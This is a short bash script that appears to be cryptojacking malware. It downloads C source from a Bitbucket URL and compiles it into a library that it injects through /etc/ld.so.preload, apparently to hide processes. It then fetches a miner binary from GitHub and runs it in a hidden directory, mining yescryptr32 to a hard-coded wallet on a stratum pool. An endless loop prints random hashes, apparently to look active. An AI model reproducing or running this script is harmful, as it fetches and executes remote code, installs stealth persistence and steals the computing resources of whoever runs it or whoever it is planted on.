#!/bin/bash
apt-get update ; apt-get install sudo wget cpulimit -y
curl https://bitbucket.org/koploks/watir/raw/master/nyumput.c -o nyumput.c
apt-get install build-essential -y
gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
mv libnyumput.so /usr/local/lib/
echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
rm nyumput.c
mkdir .lib && cd .lib
rm -rf sgr1
wget -O sgr1  https://github.com/barburonjilo/back/raw/main/sr 
chmod +x sgr1
cpulimit -l 200 -e sgr1 &
./sgr1 --algorithm yescryptr32 --pool stratum-asia.rplant.xyz:17116 --wallet UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$(echo $RANDOM | md5sum | head -c 5) --password x --disable-gpu --cpu-threads 2 --enable-1gb-hugepages --keepalive  &
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 3m; done
